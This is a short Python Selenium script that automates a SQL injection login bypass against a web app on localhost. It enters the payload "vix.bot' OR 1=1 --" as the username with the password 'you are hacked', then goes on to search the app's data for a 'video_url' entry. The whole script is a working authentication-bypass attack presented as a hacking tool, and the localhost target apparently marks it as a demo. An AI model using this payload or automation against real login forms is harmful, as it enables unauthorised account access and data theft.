
import time, os
from selenium import webdriver
from selenium.webdriver.common.by import By

web = webdriver.Chrome()
os.system('color 2')

username = "vix.bot' OR 1=1 --"
passw = "you are hacked"
instaid = 'vix.bot'
filterkey = 'video_url'

web.get('http://127.0.0.1:5000')
time.sleep(2)

user = web.find_element(By.XPATH, '/html/body/center/table/tbody/tr/td[1]/a')
user.click()

def fun_login(passw):
    try:
        user = web.find_element(By.XPATH, '/html/body/center[2]/form/input[1]')
        user.send_keys(username)
        time.sleep(1)

        hack = web.find_element(By.XPATH, '/html/body/center[2]/form/input[2]')
        hack.send_keys(passw)
        time.sleep(1)

        Submit = web.find_element(By.XPATH, '/html/body/center[2]/form/input[3]')
        Submit.click()
        time.sleep(2)

        hack = web.find_element(By.XPATH, '/html/body/center/form/input[1]')
        hack.send_keys(instaid)
        time.sleep(1)

        Submit = web.find_element(By.XPATH, '/html/body/center/form/input[2]')
        Submit.click()
        time.sleep(2)

        hack = web.find_element(By.XPATH, '//*[@id="myInput"]')
        hack.send_keys(filterkey)
        time.sleep(1)

        Submit = web.find_element(By.XPATH, '//*[@id="myTable"]/tbody/tr[59]/td[1]/a')
        Submit.click()
        
    except:
        web.refresh()

time.sleep(2)
fun_login(passw)

input('\n\n\nPress enter to exit browser\n\n\n')
os.system('color 7')
